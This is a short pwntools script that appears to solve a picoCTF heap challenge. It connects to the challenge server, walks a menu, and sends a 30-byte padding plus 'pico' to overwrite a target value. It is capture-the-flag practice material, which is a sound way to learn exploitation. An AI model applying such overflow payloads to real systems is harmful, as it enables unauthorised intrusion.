from pwn import *

#p = gdb.debug(["./chall"])

p = remote("tethys.picoctf.net", 63848)

p.sendline(b"5")
p.sendline(b"2")
p.sendline(b"40")
p.sendline(b"A"*30 + b"pico")
p.sendline(b"4")

p.interactive()
